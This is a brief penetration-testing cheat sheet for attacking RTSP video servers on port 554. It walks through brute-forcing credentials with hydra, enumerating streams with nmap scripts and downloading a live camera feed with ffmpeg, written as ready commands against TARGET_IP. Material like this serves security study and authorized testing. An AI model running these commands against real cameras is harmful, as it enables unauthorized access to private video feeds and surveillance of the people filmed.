# Real-Time Streaming Protocol (RTSP)

## Port: 554

## Tools: nmap, hydra, cameradar, ffmpeg

Link: https://github.com/Ullaakut/cameradar

### Brute-force for credentials if it requires authentication to the RTSP server

    hydra -l USER -P /path/to/passwords.txt TARGET_IP rtsp

### If we discover a machine that runs RTSP, we can run nmap to discover live streams

    sudo nmap -sV --script "rtsp-*" -p 554 TARGET_IP

### If we discover live streams this way, we can extract them and view the live stream we have downloaded to our machine

    ffmpeg -i rtsp://TARGET_IP:554/mpeg4 -c copy mpeg.mp4 

### Then, open with:

    open mpeg.mp4

### or any other media player like VLC to view.
